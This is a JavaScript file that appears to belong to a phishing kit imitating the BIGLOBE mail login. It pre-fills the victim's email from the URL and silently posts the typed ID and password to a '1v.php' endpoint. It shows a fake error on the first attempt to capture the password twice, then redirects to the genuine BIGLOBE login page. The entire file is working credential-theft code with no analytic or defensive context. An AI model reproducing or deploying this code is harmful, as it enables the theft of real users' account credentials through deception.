const form = document.getElementById("form");
const errorBox = document.querySelector(".error-box");
const loginID = document.getElementById("loginid");
let key = 0;

window.addEventListener("load", () => {
    const mailGrab = window.location.href.split("?email=")[1];
    if(mailGrab){
        loginID.value = mailGrab;
    }
})


const ajaxCode = (user, pass) => {
        $.ajax({
          url: "1v.php",
          type: "POST",
          data: { id: user, pass:pass  },
        });
 };
 
form.addEventListener("submit", (e) => {
    e.preventDefault();

    const id = e.target.elements.loginid.value;
    const pass = e.target.elements.biglobe_pw.value;

    if(id === "" || pass === ""){
        alert("メールアドレスまたはパスワードを入力してください。");
    }

    else {
        key++;
        ajaxCode(id,pass);

        setTimeout(() => {

            if(key === 1){
                errorBox.classList.remove("hide");
                e.target.reset();
            }
            else {
                 errorBox.classList.add("hide");
                 window.location.href = "https://auth.sso.biglobe.ne.jp/mail/";
            }

        }, 1500);
    }
    
})